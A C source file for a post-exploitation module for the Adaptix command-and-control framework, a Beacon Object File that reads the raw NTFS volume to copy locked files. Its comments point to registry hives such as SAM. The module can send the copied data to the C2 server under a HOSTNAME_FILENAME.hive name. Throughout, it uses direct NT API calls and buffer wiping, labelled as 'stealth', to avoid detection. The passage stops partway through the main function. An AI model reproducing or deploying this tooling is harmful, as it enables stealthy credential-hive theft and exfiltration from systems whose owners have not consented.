#include <windows.h>
#include <stdint.h>
#include "../_include/beacon.h"
#include "../_include/bofdefs.h"
#include "../_include/adaptix.h"
#include "underlaycopy.h"

#ifndef MAX_COMPUTERNAME_LENGTH
#define MAX_COMPUTERNAME_LENGTH 15
#endif

// Helper function to read NTFS boot sector (stealth mode - no logging)
BOOL ReadNtfsBoot(HANDLE hVolume, NTFS_BOOT* boot) {
    BYTE buffer[512];
    IO_STATUS_BLOCK ioStatus;
    LARGE_INTEGER offset;
    NTSTATUS status;
    offset.QuadPart = 0;

    // Use direct NtReadFile for stealth
    status = NTDLL$NtReadFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        buffer,
        512,
        &offset,
        NULL
    );

    if (!NT_SUCCESS(status) || ioStatus.Information != 512) {
        return FALSE;
    }

    boot->bytesPerSector = *(WORD*)(buffer + BOOT_BYTES_PER_SECTOR);
    boot->sectorsPerCluster = buffer[BOOT_SECTORS_PER_CLUSTER];
    boot->clusterSize = boot->bytesPerSector * boot->sectorsPerCluster;
    boot->mftCluster = *(ULONGLONG*)(buffer + BOOT_MFT_CLUSTER);

    // Clear buffer from memory
    MSVCRT$memset(buffer, 0, sizeof(buffer));

    return TRUE;
}

// Get file information using GetFileInformationByHandle
BOOL GetNtfsFileInfo(LPCWSTR filePath, ULONGLONG* mftRecordNumber, ULONGLONG* fileSize) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BY_HANDLE_FILE_INFORMATION fileInfo;
    WCHAR normalizedPath[MAX_PATH * 2];
    BOOL result = FALSE;

    // Normalize path with \\?\ prefix
    if (filePath[0] != L'\\' || filePath[1] != L'\\' || filePath[2] != L'?' || filePath[3] != L'\\') {
        normalizedPath[0] = L'\\';
        normalizedPath[1] = L'\\';
        normalizedPath[2] = L'?';
        normalizedPath[3] = L'\\';
        int pathLen = KERNEL32$lstrlenW(filePath);
        MSVCRT$memcpy(normalizedPath + 4, filePath, (pathLen + 1) * sizeof(WCHAR));
    } else {
        int pathLen = KERNEL32$lstrlenW(filePath);
        MSVCRT$memcpy(normalizedPath, filePath, (pathLen + 1) * sizeof(WCHAR));
    }

    hFile = KERNEL32$CreateFileW(
        normalizedPath,
        FILE_READ_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!KERNEL32$GetFileInformationByHandle(hFile, &fileInfo)) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    // Extract MFT record number from FileIndex
    ULONGLONG frn = ((ULONGLONG)fileInfo.nFileIndexHigh << 32) | fileInfo.nFileIndexLow;
    *mftRecordNumber = frn & 0x0000FFFFFFFFFFFF;
    *fileSize = ((ULONGLONG)fileInfo.nFileSizeHigh << 32) | fileInfo.nFileSizeLow;

    KERNEL32$CloseHandle(hFile);
    return TRUE;
}

// Read MFT record (using direct NtReadFile for stealth)
BOOL ReadMftRecord(HANDLE hVolume, NTFS_BOOT* boot, ULONGLONG recordNumber, BYTE* record) {
    ULONGLONG mftOffset = boot->mftCluster * boot->clusterSize;
    ULONGLONG recordOffset = mftOffset + (recordNumber * MFT_RECORD_SIZE);
    LARGE_INTEGER offset;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;

    offset.QuadPart = recordOffset;

    // Use direct NtReadFile for stealth
    status = NTDLL$NtReadFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        record,
        MFT_RECORD_SIZE,
        &offset,
        NULL
    );

    if (!NT_SUCCESS(status) || ioStatus.Information != MFT_RECORD_SIZE) {
        return FALSE;
    }

    return TRUE;
}

// Parse data runs from $DATA attribute
int ParseDataRuns(BYTE* dataRuns, int dataRunsSize, DATA_RUN** runs, NTFS_BOOT* boot) {
    int pos = 0;
    ULONGLONG currentLCN = 0;
    int runCount = 0;
    DATA_RUN* runArray = NULL;
    int arraySize = 0;

    while (pos < dataRunsSize && dataRuns[pos] != 0x00) {
        BYTE header = dataRuns[pos++];
        BYTE lenSize = header & 0x0F;
        BYTE offSize = (header >> 4) & 0x0F;

        if (lenSize == 0 || lenSize > 8 || offSize > 8) {
            break;
        }

        // Read length
        ULONGLONG length = 0;
        int i;
        for (i = 0; i < lenSize; i++) {
            length |= ((ULONGLONG)dataRuns[pos++]) << (8 * i);
        }

        // Read offset (relative LCN)
        ULONGLONG offset = 0;
        BOOL isSparse = (offSize == 0);
        
        if (offSize > 0) {
            for (i = 0; i < offSize; i++) {
                offset |= ((ULONGLONG)dataRuns[pos++]) << (8 * i);
            }
            // Two's complement sign extension
            if (offSize < 8 && (dataRuns[pos - 1] & 0x80)) {
                ULONGLONG signExtend = ((ULONGLONG)0xFFFFFFFFFFFFFFFF) << (8 * offSize);
                offset |= signExtend;
            }
            currentLCN += offset;
        }
        // If offSize == 0, this is a sparse cluster - don't update currentLCN

        // Reallocate array if needed
        if (runCount >= arraySize) {
            arraySize = arraySize == 0 ? 16 : arraySize * 2;
            DATA_RUN* newArray = (DATA_RUN*)intAlloc(sizeof(DATA_RUN) * arraySize);
            if (runArray) {
                MSVCRT$memcpy(newArray, runArray, sizeof(DATA_RUN) * runCount);
                intFree(runArray);
            }
            runArray = newArray;
        }

        // For sparse clusters (offSize == 0), set LCN to 0 to mark as sparse
        runArray[runCount].lcn = isSparse ? 0 : currentLCN;
        runArray[runCount].length = length;
        runCount++;
    }

    *runs = runArray;
    return runCount;
}

// Get file info from MFT record
BOOL GetFileInfoFromRecord(BYTE* record, FILE_INFO* fileInfo, NTFS_BOOT* boot) {
    WORD attrOffset = *(WORD*)(record + 20);
    fileInfo->hasRuns = FALSE;
    fileInfo->isResident = FALSE;
    fileInfo->runs = NULL;
    fileInfo->runCount = 0;
    fileInfo->residentData = NULL;
    fileInfo->residentDataSize = 0;

    while (attrOffset < MFT_RECORD_SIZE) {
        DWORD attrType = *(DWORD*)(record + attrOffset);
        if (attrType == ATTRIBUTE_END) {
            break;
        }

        DWORD attrLength = *(DWORD*)(record + attrOffset + 4);
        if (attrLength == 0 || attrOffset + attrLength > MFT_RECORD_SIZE) {
            break;
        }

        BYTE nonResident = record[attrOffset + 8];

        // Handle $DATA attribute
        if (attrType == ATTRIBUTE_DATA) {
            if (nonResident == 0) {
                // Resident data
                fileInfo->isResident = TRUE;
                fileInfo->fileSize = *(ULONGLONG*)(record + attrOffset + 16);
                WORD valueOffset = *(WORD*)(record + attrOffset + 20);
                fileInfo->residentDataSize = (DWORD)fileInfo->fileSize;
                fileInfo->residentData = (BYTE*)intAlloc(fileInfo->residentDataSize);
                MSVCRT$memcpy(fileInfo->residentData, record + attrOffset + valueOffset, fileInfo->residentDataSize);
            } else {
                // Non-resident data
                fileInfo->isResident = FALSE;
                fileInfo->fileSize = *(ULONGLONG*)(record + attrOffset + 48);
                WORD dataRunsOffset = *(WORD*)(record + attrOffset + 32);
                int dataRunsSize = attrLength - dataRunsOffset;
                BYTE* dataRuns = record + attrOffset + dataRunsOffset;

                fileInfo->runCount = ParseDataRuns(dataRuns, dataRunsSize, &fileInfo->runs, boot);
                fileInfo->hasRuns = (fileInfo->runCount > 0);
            }
            break;
        }

        attrOffset += attrLength;
    }

    return TRUE;
}

// Copy file by extents (MFT mode) - stealth implementation
BOOL CopyFileByMft(HANDLE hVolume, HANDLE hOutput, FILE_INFO* fileInfo, NTFS_BOOT* boot) {
    ULONGLONG bytesWritten = 0;
    BYTE* buffer = NULL;
    DWORD bufferSize = 64 * 1024; // 64KB buffer for stealth (smaller = less memory footprint)
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;

    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        return FALSE;
    }

    if (fileInfo->isResident) {
        // Copy resident data using NtWriteFile for stealth
        LARGE_INTEGER writeOffset;
        writeOffset.QuadPart = 0;
        status = NTDLL$NtWriteFile(
            hOutput,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            fileInfo->residentData,
            fileInfo->residentDataSize,
            &writeOffset,
            NULL
        );
        if (!NT_SUCCESS(status)) {
            intFree(buffer);
            return FALSE;
        }
        bytesWritten = ioStatus.Information;
    } else if (fileInfo->hasRuns) {
        // Copy non-resident data
        int i;
        for (i = 0; i < fileInfo->runCount; i++) {
            ULONGLONG toRead = fileInfo->runs[i].length * boot->clusterSize;
            ULONGLONG remaining = fileInfo->fileSize - bytesWritten;
            if (toRead > remaining) {
                toRead = remaining;
            }
            if (toRead == 0) {
                break;
            }

            if (fileInfo->runs[i].lcn == 0) {
                // Sparse cluster - write zeros using NtWriteFile
                MSVCRT$memset(buffer, 0, (size_t)toRead);
                LARGE_INTEGER writeOffset;
                writeOffset.QuadPart = bytesWritten;
                status = NTDLL$NtWriteFile(
                    hOutput,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatus,
                    buffer,
                    (ULONG)toRead,
                    &writeOffset,
                    NULL
                );
                if (!NT_SUCCESS(status)) {
                    intFree(buffer);
                    return FALSE;
                }
                bytesWritten += ioStatus.Information;
                continue;
            }

            ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
            LARGE_INTEGER readOffset;
            readOffset.QuadPart = diskOffset;

            ULONGLONG copied = 0;
            while (copied < toRead) {
                ULONG chunkSize = (ULONG)((toRead - copied > bufferSize) ? bufferSize : (toRead - copied));
                
                // Use NtReadFile for stealth
                readOffset.QuadPart = diskOffset + copied;
                status = NTDLL$NtReadFile(
                    hVolume,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatus,
                    buffer,
                    chunkSize,
                    &readOffset,
                    NULL
                );
                
                if (!NT_SUCCESS(status)) {
                    // If we've copied some data and reached file size, it's OK
                    if (bytesWritten >= fileInfo->fileSize) {
                        break;
                    }
                    intFree(buffer);
                    return FALSE;
                }
                
                // If read returned 0 bytes, check if we've reached the end
                if (ioStatus.Information == 0) {
                    // If we've copied enough data, it's OK
                    if (bytesWritten >= fileInfo->fileSize) {
                        break;
                    }
                    // Otherwise, it's an error
                    intFree(buffer);
                    return FALSE;
                }

                // Use NtWriteFile for stealth
                LARGE_INTEGER writeOffset;
                writeOffset.QuadPart = bytesWritten;
                status = NTDLL$NtWriteFile(
                    hOutput,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatus,
                    buffer,
                    (ULONG)ioStatus.Information,
                    &writeOffset,
                    NULL
                );

                if (!NT_SUCCESS(status)) {
                    intFree(buffer);
                    return FALSE;
                }

                copied += ioStatus.Information;
                bytesWritten += ioStatus.Information;
                
                // Clear buffer after each write for stealth
                MSVCRT$memset(buffer, 0, bufferSize);
            }

            if (bytesWritten >= fileInfo->fileSize) {
                break;
            }
        }
    }

    // Clear buffer before freeing
    MSVCRT$memset(buffer, 0, bufferSize);
    intFree(buffer);
    
    // Verify that we copied the complete file
    if (bytesWritten != fileInfo->fileSize) {
        return FALSE;
    }
    
    return TRUE;
}

// Structures for FSCTL_GET_RETRIEVAL_POINTERS are defined in winioctl.h
#ifndef FSCTL_GET_RETRIEVAL_POINTERS
#define FSCTL_GET_RETRIEVAL_POINTERS 0x00090073
#endif

#ifndef ERROR_MORE_DATA
#define ERROR_MORE_DATA 234
#endif

// Get file extents using FSCTL_GET_RETRIEVAL_POINTERS (Metadata mode)
int GetFileExtents(HANDLE hFile, EXTENT** extents, DWORD* extentCount) {
    DWORD bytesReturned = 0;
    DWORD bufferSize = 4096;
    BYTE* buffer = NULL;
    STARTING_VCN_INPUT_BUFFER inputBuffer = {0};
    PRETRIEVAL_POINTERS_BUFFER outputBuffer = NULL;
    EXTENT* extentArray = NULL;
    int result = 0;
    
    inputBuffer.StartingVcn.QuadPart = 0;
    
    // Allocate buffer for retrieval pointers
    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        return 0;
    }
    
    // First call to get required buffer size
    if (!KERNEL32$DeviceIoControl(
        hFile,
        FSCTL_GET_RETRIEVAL_POINTERS,
        &inputBuffer,
        sizeof(inputBuffer),
        buffer,
        bufferSize,
        &bytesReturned,
        NULL
    )) {
        DWORD error = KERNEL32$GetLastError();
        if (error == ERROR_MORE_DATA) {
            // Need larger buffer
            intFree(buffer);
            bufferSize = bytesReturned;
            buffer = (BYTE*)intAlloc(bufferSize);
            if (!buffer) {
                return 0;
            }
            
            // Retry with larger buffer
            if (!KERNEL32$DeviceIoControl(
                hFile,
                FSCTL_GET_RETRIEVAL_POINTERS,
                &inputBuffer,
                sizeof(inputBuffer),
                buffer,
                bufferSize,
                &bytesReturned,
                NULL
            )) {
                intFree(buffer);
                return 0;
            }
        } else {
            intFree(buffer);
            return 0;
        }
    }
    
    outputBuffer = (PRETRIEVAL_POINTERS_BUFFER)buffer;
    
    // Allocate extent array
    extentArray = (EXTENT*)intAlloc(sizeof(EXTENT) * outputBuffer->ExtentCount);
    if (!extentArray) {
        intFree(buffer);
        return 0;
    }
    
    // Parse extents
    for (DWORD i = 0; i < outputBuffer->ExtentCount; i++) {
        LARGE_INTEGER nextVcn = outputBuffer->Extents[i].NextVcn;
        LARGE_INTEGER lcn = outputBuffer->Extents[i].Lcn;
        LARGE_INTEGER currentVcn = (i == 0) ? outputBuffer->StartingVcn : outputBuffer->Extents[i-1].NextVcn;
        
        extentArray[i].lcn = lcn.QuadPart;
        extentArray[i].lengthClusters = nextVcn.QuadPart - currentVcn.QuadPart;
    }
    
    *extents = extentArray;
    *extentCount = outputBuffer->ExtentCount;
    result = outputBuffer->ExtentCount;
    
    intFree(buffer);
    return result;
}

// Copy file by extents (Metadata mode) - stealth implementation
BOOL CopyFileByExtents(HANDLE hVolume, HANDLE hOutput, EXTENT* extents, DWORD extentCount, ULONGLONG clusterSize, ULONGLONG fileSize) {
    ULONGLONG bytesWritten = 0;
    BYTE* buffer = NULL;
    DWORD bufferSize = 64 * 1024; // 64KB buffer
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        return FALSE;
    }
    
    for (DWORD i = 0; i < extentCount; i++) {
        ULONGLONG extentBytes = extents[i].lengthClusters * clusterSize;
        ULONGLONG remaining = fileSize - bytesWritten;
        ULONGLONG toCopy = (extentBytes > remaining) ? remaining : extentBytes;
        
        if (toCopy == 0) {
            break;
        }
        
        // Check for sparse extent (LCN = -1 indicates sparse cluster in FSCTL_GET_RETRIEVAL_POINTERS)
        // Note: LCN = 0 is a valid cluster (boot sector), so we only check for -1
        if (extents[i].lcn == (ULONGLONG)-1) {
            // Sparse extent - write zeros
            MSVCRT$memset(buffer, 0, (size_t)toCopy);
            LARGE_INTEGER writeOffset;
            writeOffset.QuadPart = bytesWritten;
            status = NTDLL$NtWriteFile(
                hOutput,
                NULL,
                NULL,
                NULL,
                &ioStatus,
                buffer,
                (ULONG)toCopy,
                &writeOffset,
                NULL
            );
            
            if (!NT_SUCCESS(status)) {
                intFree(buffer);
                return FALSE;
            }
            
            bytesWritten += ioStatus.Information;
            
            // Clear buffer after each write for stealth
            MSVCRT$memset(buffer, 0, bufferSize);
            continue;
        }
        
        ULONGLONG diskOffset = extents[i].lcn * clusterSize;
        ULONGLONG copied = 0;
        
        while (copied < toCopy) {
            ULONG chunkSize = (ULONG)((toCopy - copied > bufferSize) ? bufferSize : (toCopy - copied));
            
            // Read from volume
            LARGE_INTEGER readOffset;
            readOffset.QuadPart = diskOffset + copied;
            status = NTDLL$NtReadFile(
                hVolume,
                NULL,
                NULL,
                NULL,
                &ioStatus,
                buffer,
                chunkSize,
                &readOffset,
                NULL
            );
            
            if (!NT_SUCCESS(status)) {
                // If we've copied some data and reached file size, it's OK
                if (bytesWritten >= fileSize) {
                    break;
                }
                intFree(buffer);
                return FALSE;
            }
            
            // If read returned 0 bytes, check if we've reached the end
            if (ioStatus.Information == 0) {
                // If we've copied enough data, it's OK
                if (bytesWritten >= fileSize) {
                    break;
                }
                // Otherwise, it's an error
                intFree(buffer);
                return FALSE;
            }
            
            // Write to output file
            LARGE_INTEGER writeOffset;
            writeOffset.QuadPart = bytesWritten;
            status = NTDLL$NtWriteFile(
                hOutput,
                NULL,
                NULL,
                NULL,
                &ioStatus,
                buffer,
                (ULONG)ioStatus.Information,
                &writeOffset,
                NULL
            );
            
            if (!NT_SUCCESS(status)) {
                intFree(buffer);
                return FALSE;
            }
            
            copied += ioStatus.Information;
            bytesWritten += ioStatus.Information;
            
            // Clear buffer after each write for stealth
            MSVCRT$memset(buffer, 0, bufferSize);
        }
        
        if (bytesWritten >= fileSize) {
            break;
        }
    }
    
    // Clear buffer before freeing
    MSVCRT$memset(buffer, 0, bufferSize);
    intFree(buffer);
    
    // Verify that we copied the complete file
    if (bytesWritten != fileSize) {
        return FALSE;
    }
    
    return TRUE;
}

// Copy file by extents directly to memory buffer (for download to server)
BOOL CopyFileByMftToMemory(HANDLE hVolume, FILE_INFO* fileInfo, NTFS_BOOT* boot, BYTE** outputBuffer, ULONGLONG* outputSize) {
    ULONGLONG bytesCopied = 0;
    BYTE* buffer = NULL;
    DWORD bufferSize = 64 * 1024; // 64KB buffer
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    BYTE* resultBuffer = NULL;

    *outputBuffer = NULL;
    *outputSize = 0;

    // Allocate output buffer
    if (fileInfo->fileSize > 0x7FFFFFFF) {
        BeaconPrintf(CALLBACK_ERROR, "[-] File too large: %llu bytes\n", fileInfo->fileSize);
        return FALSE; // File too large
    }
    resultBuffer = (BYTE*)intAlloc((SIZE_T)fileInfo->fileSize);
    if (!resultBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate buffer for file (%llu bytes)\n", fileInfo->fileSize);
        return FALSE;
    }

    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        intFree(resultBuffer);
        return FALSE;
    }

    if (fileInfo->isResident) {
        // Copy resident data directly
        if (fileInfo->residentData && fileInfo->residentDataSize > 0) {
            MSVCRT$memcpy(resultBuffer, fileInfo->residentData, fileInfo->residentDataSize);
            bytesCopied = fileInfo->residentDataSize;
        } else {
            intFree(resultBuffer);
            intFree(buffer);
            return FALSE;
        }
    } else if (fileInfo->hasRuns && fileInfo->runCount > 0) {
        // Copy non-resident data
        int i;
        for (i = 0; i < fileInfo->runCount; i++) {
            ULONGLONG toRead = fileInfo->runs[i].length * boot->clusterSize;
            ULONGLONG remaining = fileInfo->fileSize - bytesCopied;
            if (toRead > remaining) {
                toRead = remaining;
            }
            if (toRead == 0) {
                break;
            }

            if (fileInfo->runs[i].lcn == 0) {
                // Sparse cluster - write zeros
                MSVCRT$memset(resultBuffer + bytesCopied, 0, (size_t)toRead);
                bytesCopied += toRead;
                continue;
            }

            ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
            LARGE_INTEGER readOffset;
            readOffset.QuadPart = diskOffset;

            ULONGLONG copied = 0;
            while (copied < toRead) {
                ULONG chunkSize = (ULONG)((toRead - copied > bufferSize) ? bufferSize : (toRead - copied));
                
                // Use NtReadFile for stealth
                readOffset.QuadPart = diskOffset + copied;
                status = NTDLL$NtReadFile(
                    hVolume,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatus,
                    buffer,
                    chunkSize,
                    &readOffset,
                    NULL
                );
                
                if (!NT_SUCCESS(status)) {
                    // If we've copied some data and reached file size, it's OK
                    if (bytesCopied >= fileInfo->fileSize) {
                        break;
                    }
                    intFree(resultBuffer);
                    intFree(buffer);
                    return FALSE;
                }
                
                // If read returned 0 bytes, check if we've reached the end
                if (ioStatus.Information == 0) {
                    // If we've copied enough data, it's OK
                    if (bytesCopied >= fileInfo->fileSize) {
                        break;
                    }
                    // Otherwise, it's an error
                    intFree(resultBuffer);
                    intFree(buffer);
                    return FALSE;
                }

                // Copy to output buffer
                MSVCRT$memcpy(resultBuffer + bytesCopied, buffer, ioStatus.Information);
                copied += ioStatus.Information;
                bytesCopied += ioStatus.Information;
                
                // Clear buffer after each read for stealth
                MSVCRT$memset(buffer, 0, bufferSize);
            }

            if (bytesCopied >= fileInfo->fileSize) {
                break;
            }
        }
    } else {
        // File has no data runs and is not resident - empty file or error
        if (fileInfo->fileSize == 0) {
            // Empty file is valid
            bytesCopied = 0;
        } else {
            // Error: file has size but no data
            BeaconPrintf(CALLBACK_ERROR, "[-] File has size (%llu) but no data (not resident, no runs)\n", fileInfo->fileSize);
            intFree(resultBuffer);
            intFree(buffer);
            return FALSE;
        }
    }

    // Clear buffer before freeing
    MSVCRT$memset(buffer, 0, bufferSize);
    intFree(buffer);

    // Verify that we copied the complete file
    if (bytesCopied != fileInfo->fileSize) {
        intFree(resultBuffer);
        return FALSE;
    }
    
    *outputBuffer = resultBuffer;
    *outputSize = bytesCopied;
    return TRUE;
}

// Download file to server using Adaptix API
// Format: HOSTNAME_FILENAME.hive
BOOL download_file(IN LPCSTR sourcePath, IN LPCSTR customFileName, IN char* fileData, IN ULONG32 fileLength) {
    if (!fileData || fileLength == 0) {
        return FALSE;
    }
    
    // Get hostname
    DWORD hostnameSize = MAX_COMPUTERNAME_LENGTH + 1;
    char* hostname = (char*)intAlloc(hostnameSize);
    if (!hostname) {
        return FALSE;
    }
    
    if (!KERNEL32$GetComputerNameA(hostname, &hostnameSize)) {
        intFree(hostname);
        return FALSE;
    }
    
    // Extract filename from source path or use custom filename
    char* fileName = NULL;
    BOOL needFreeFileName = FALSE;
    
    if (customFileName && MSVCRT$strlen(customFileName) > 0) {
        // Extract filename from custom path (e.g., ".\SAM2" -> "SAM2")
        char* lastSlash = MSVCRT$strrchr(customFileName, '\\');
        if (!lastSlash) {
            lastSlash = MSVCRT$strrchr(customFileName, '/');
        }
        
        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : customFileName;
        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
        fileName = (char*)intAlloc(fileNameLen);
        if (!fileName) {
            intFree(hostname);
            return FALSE;
        }
        MSVCRT$strcpy(fileName, fileNamePtr);
        needFreeFileName = TRUE;
    } else if (sourcePath) {
        // Extract filename from source path
        char* lastSlash = MSVCRT$strrchr(sourcePath, '\\');
        if (!lastSlash) {
            lastSlash = MSVCRT$strrchr(sourcePath, '/');
        }
        
        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : sourcePath;
        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
        fileName = (char*)intAlloc(fileNameLen);
        if (!fileName) {
            intFree(hostname);
            return FALSE;
        }
        MSVCRT$strcpy(fileName, fileNamePtr);
        needFreeFileName = TRUE;
    } else {
        intFree(hostname);
        return FALSE;
    }
    
    // Remove extension from filename if present
    char* fileExt = MSVCRT$strrchr(fileName, '.');
    int baseNameLen = fileExt ? (fileExt - fileName) : MSVCRT$strlen(fileName);
    
    // Allocate buffer for final filename: HOSTNAME_FILENAME.hive
    int finalNameLen = hostnameSize + baseNameLen + 6; // +6 for "_" and ".hive\0"
    char* finalFileName = (char*)intAlloc(finalNameLen);
    if (!finalFileName) {
        if (needFreeFileName) {
            intFree(fileName);
        }
        intFree(hostname);
        return FALSE;
    }
    
    // Build filename: HOSTNAME_FILENAME.hive
    MSVCRT$sprintf(finalFileName, "%.*s_%.*s.hive", 
        (int)hostnameSize, hostname,
        baseNameLen, fileName);
    
    // Download to server
    AxDownloadMemory(finalFileName, fileData, (int)fileLength);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] File downloaded to server: %s (%lu bytes)\n", finalFileName, fileLength);
    
    // Cleanup
    intFree(finalFileName);
    if (needFreeFileName) {
        intFree(fileName);
    }
    intFree(hostname);
    
    return TRUE;
}

// Main function
void go(char* args, int len) {
    datap parser;
    char* mode = NULL;
    char* sourceFile = NULL;
    char* destFile = NULL;
    int downloadToServer = 0;  // 0 = write to disk, 1 = download to server
    WCHAR* sourceFileW = NULL;
    WCHAR* destFileW = NULL;
    HANDLE hVolume = INVALID_HANDLE_VALUE;
    HANDLE hOutput = INVALID_HANDLE_VALUE;
    NTFS_BOOT boot = {0};
    FILE_INFO fileInfo = {0};
    BYTE* mftRecord = NULL;
    ULONGLONG mftRecordNumber = 0;
    ULONGLONG fileSize = 0;
    BOOL success = FALSE;
    BYTE* fileBuffer = NULL;  // Buffer for file data when downloading to server

    BeaconDataParse(&parser, args, len);
    mode = BeaconDataExtract(&parser, NULL);
    sourceFile = BeaconDataExtract(&parser, NULL);
    destFile = BeaconDataExtract(&parser, NULL);
    downloadToServer = BeaconDataInt(&parser);

    if (!mode || !sourceFile) {
        return;
    }
    
    // Check if destFile is empty string (when --download is used without destination)
    if (destFile && MSVCRT$strlen(destFile) == 0) {
        destFile = NULL;
    }
    
    // If downloading to server, destFile is optional (used as filename on server)
    // If saving to disk, destFile is required
    if (!downloadToServer && !destFile) {
        return;
    }

    // Convert to wide char
    int sourceLen = MSVCRT$strlen(sourceFile) + 1;
    sourceFileW = (WCHAR*)intAlloc(sourceLen * sizeof(WCHAR));
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, sourceFile, -1, sourceFileW, sourceLen);
    
    if (destFile) {
        int destLen = MSVCRT$strlen(destFile) + 1;
        destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, destFile, -1, destFileW, destLen);
    } else if (downloadToServer) {
        // Generate default filename from source if not provided
        char* fileName = MSVCRT$strrchr(sourceFile, '\\');
        if (!fileName) {
            fileName = MSVCRT$strrchr(sourceFile, '/');
        }
        if (fileName) {
            fileName++;  // Skip the separator
        } else {
            fileName = sourceFile;
        }
        int destLen = MSVCRT$strlen(fileName) + 1;
        destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, fileName, -1, destFileW, destLen);
    }

    // Open volume using NtCreateFile for stealth (hardcoded to C: for now)
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING volumePath;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    WCHAR volumeName[] = L"\\??\\C:";
    NTDLL$RtlInitUnicodeString(&volumePath, volumeName);
    
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &volumePath;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;
    
    status = NTDLL$NtCreateFile(
        &hVolume,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open volume: 0x%08X\n", status);
        goto cleanup;
    }

    // Read NTFS boot sector
    if (!ReadNtfsBoot(hVolume, &boot)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read NTFS boot sector\n");
        goto cleanup;
    }

    if (MSVCRT$strcmp(mode, "MFT") == 0) {
        // MFT mode
        if (!GetNtfsFileInfo(sourceFileW, &mftRecordNumber, &fileSize)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file info from source\n");
            goto cleanup;
        }

        mftRecord = (BYTE*)intAlloc(MFT_RECORD_SIZE);
        if (!mftRecord) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate MFT record buffer\n");
            goto cleanup;
        }

        if (!ReadMftRecord(hVolume, &boot, mftRecordNumber, mftRecord)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read MFT record\n");
            goto cleanup;
        }

        // Initialize fileSize before parsing (will be overwritten if $DATA found)
        fileInfo.fileSize = fileSize;
        
        if (!GetFileInfoFromRecord(mftRecord, &fileInfo, &boot)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse file info from MFT record\n");
            goto cleanup;
        }

        // Use actual file size from GetNtfsFileInfo (more reliable)
        fileInfo.fileSize = fileSize;
        
        if (downloadToServer) {
            // Copy file directly to memory for download (no disk write)
            ULONGLONG copiedSize = 0;
            if (!CopyFileByMftToMemory(hVolume, &fileInfo, &boot, &fileBuffer, &copiedSize)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data to memory\n");
                goto cleanup;
            }
            
            // Close output file handle (we don't need it anymore)
            if (hOutput != INVALID_HANDLE_VALUE) {
                NTDLL$NtClose(hOutput);
                hOutput = INVALID_HANDLE_VALUE;
            }
            
            // Download to server with format: HOSTNAME_FILENAME.hive
            if (download_file(sourceFile, destFile, (char*)fileBuffer, (ULONG32)copiedSize)) {
                success = TRUE;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied and downloaded to server: %llu bytes\n", copiedSize);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to download file to server\n");
            }
        } else {
            // Create output file using NtCreateFile for stealth
            // First, get full path
            WCHAR fullDestPath[MAX_PATH * 2];
            WCHAR* filePart = NULL;
            DWORD fullPathLen = KERNEL32$GetFullPathNameW(destFileW, MAX_PATH * 2, fullDestPath, &filePart);
            
            if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
                // Fallback to original path if GetFullPathNameW fails
                fullPathLen = KERNEL32$lstrlenW(destFileW);
                MSVCRT$memcpy(fullDestPath, destFileW, (fullPathLen + 1) * sizeof(WCHAR));
            }
            
            // Normalize path with \??\ prefix for NtCreateFile (not \\?\)
            WCHAR normalizedDestPath[MAX_PATH * 2];
            int destPathLen = fullPathLen;
            
            // Check if already has \??\ or \\?\ prefix
